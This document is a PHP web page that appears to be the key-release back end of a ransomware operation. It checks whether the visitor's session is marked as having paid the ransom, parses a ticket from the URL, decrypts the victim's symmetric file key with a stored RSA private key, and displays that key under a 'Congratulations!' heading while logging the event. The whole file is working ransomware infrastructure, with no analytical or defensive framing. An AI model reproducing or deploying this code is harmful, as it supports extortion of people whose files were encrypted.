<!DOCTYPE HTML>
<html>
<head>
	<title></title>
	<link rel="stylesheet" href="./style/main.css">
</head>
<body>
	<div class="midcenter">
	<?php
		$errors = "";
		//Load modules
		include_once("mods/keypair.php");
		include_once("mods/session.php");
		include_once("mods/eventlog.php");
		
		//Start session
		session_start();
		$link=Session::forceConnectDB();
		
		//Check if user actually paid ransom
		if(isset($_SESSION["paid_ransom"])){
			
			//Get RSA key identity
			$keyid=hex2bin(substr($_GET["ticket"],0,4));
			$keyid=ord($keyid[0])*256+ord($keyid[1]);

			//Prepare key
			$rsakey=(new KeyPair($can_decrypt=true))->sqlImport($link, $keyid);
			if($rsakey->getPublic()==null)
				$errors.="No matching RSA key by ID<br>\n";
			
			
			//Get symmetric key
			$bin_enc_key=hex2bin(substr($_GET["ticket"],4));
			$bin_dec_key=$rsakey->decrypt($bin_enc_key);
			$symkey=bin2hex($bin_dec_key);
			
			
			if($symkey){
				//Offer congratulatory note
				echo("<h1>Congratulations!</h1>");	
				echo("<strong>Decryption Key:</strong><br>".$symkey);
				EventLog::addEntry($link, EventLog::CLIENTHOST_EVENT, "Decrypted key");
			}else{
				
				//An error occured
				echo("<h1>Oh no!</h1>\nSomething went wrong! We weren't able to decrypt your key.<br><br>");
				echo($errors);
				unset($_SESSION);
				session_destroy();
				EventLog::addEntry($link, EventLog::CLIENTHOST_EVENT, "Decrypted key(failed)");
			}
		}else{
			
			//Notify user isn't authenticated
			echo("<h1 style='color:red'>Not Authenticated</h1>");
			session_destroy();
		}
	?>
		
	</div>
</body>
</html>